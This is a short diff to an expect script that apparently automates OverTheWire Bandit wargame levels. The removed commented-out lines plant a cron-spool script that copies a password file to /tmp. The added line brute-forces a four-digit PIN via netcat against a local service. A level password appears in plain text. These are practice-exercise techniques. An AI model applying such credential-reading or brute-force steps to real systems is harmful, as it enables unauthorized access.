@@ -7,24 +7,10 @@ expect "*\$ "
 
 interact
 
-# send "cat /etc/cron.d/cronjob_bandit24\r"
+# send "{ for i in $(seq -f "%04g" 0 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done; } | nc localhost 30002 > /tmp/brute.txt\r"
 # expect "*\$ "
 
-# send "cat /usr/bin/cronjob_bandit24.sh\r"
-# expect "*\$ "
-
-# send "echo \"cat /etc/bandit_pass/bandit24 > /tmp/exfil\" > /var/spool/bandit24/exploit.sh\r"
-# expect "*\$ "
-
-# send "chmod +x /var/spool/bandit24/exploit.sh\r"
-# expect "*\$ "
-
-# sleep 60
-
-# send "cat /tmp/exfil\r"
-# expect "*\$ "
-
-# send "rm -f /tmp/exfil\r"
+# send "cat /tmp/brute.txt | uniq\r"
 # expect "*\$ "
 
 # send "exit\r"
